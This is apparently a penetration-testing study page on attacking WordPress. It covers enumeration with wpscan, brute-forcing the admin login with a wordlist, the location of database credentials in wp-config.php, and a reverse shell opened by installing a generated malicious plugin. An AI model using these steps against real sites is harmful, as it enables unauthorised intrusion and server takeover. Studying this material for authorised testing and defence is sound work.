# Wordpress

### Main WordPress Files

Wordpress runs on PHP and MySQL.&#x20;

Uploaded files go to: _/wp-content/uploads/_

Theme files go to: _/wp-content/themes/_

Plugin files go to _/wp-content/plugins/_

Core files go to: _/wp-includes/_

Default login paths:

* _/wp-login.php_
* _/wp-login_
* _/wp-admin/_
* _/wp-admin.php_
* _/login/_

You can find the root password of the database in /wp-config.php/

There is multiple ways to get a shell using WordPress, without valid credentials we can see if we can exploit any plugins. The reason being, Plugins are community made, therefore they can be more insecure and not as frequently updated as the actual Wordpress software.&#x20;

### Scanning Wordpress:&#x20;

```
wpscan --url http://192.168.105.55 --enumerate u -e cb -e at 
```

![](<../../../.gitbook/assets/image (36).png>)

By doing a searchsploit search of the plugins we can find vulnerable plugins that we can turn into Remote Code Execution.

![](<../../../.gitbook/assets/image (49).png>)

### Enumerating Themes and Plugins

#### Enumerate Plugins

To scan for plugins, run the following:

> wpscan --url \<URL> -e ap

Argument Key:

* "-e" is for enumeration
* "ap" is "all plugins
* "vp" is vulnerable plugins
* "p" is popular plugins

> **Tip**: I recommend always using _**--plugins-detection mixed.**_

#### Enumeration of Themes <a href="#lecture_heading" id="lecture_heading"></a>

You can specify WPScan to check for themes only by using the following:

> wpscan --url \<URL> -e at

Operator Key:

* "-e" flag is for enumeration
* "t" is "popular themes"
* "at" is "all themes"
* "vt" is "vulnerable themes" only

### Brute Forcing Wordpress:

```
wpscan –url http://example.com –passwords rockyou.txt –usernames admin
```

### Remote Code Execution through Plugins (Authenticated)

![](<../../../.gitbook/assets/image (70).png>)

In the admin panel of wordpress one will be able to see that we can install a new plugin.&#x20;

{% embed url="https://github.com/wetw0rk/malicious-wordpress-plugin" %}

This python script will automatically generate a zip file in which we can install as a plugin and then navigating to it will result in a reverse shell.&#x20;

```
python wordpwn.py <reverseip> 443 Y
```

Install the plugin.

{% embed url="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FwbAlFk105Y78ce4THBOF%2Fuploads%2FHuq7gxvitAPb9DeQc5d1%2F2022-07-16_13-33.png?alt=media&token=a9d16985-64f1-4880-a7eb-d2f6bbae27a7" %}

Navigate to it.&#x20;

{% embed url="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FwbAlFk105Y78ce4THBOF%2Fuploads%2Far5yVEWuuUlAReS2rmPO%2F2022-07-16_13-35.png?alt=media&token=aa7acb4c-c1bc-4feb-9b40-7cfaa9586f69" %}

We execute it and we get a reverse shell.&#x20;

![](<../../../.gitbook/assets/image (38).png>)
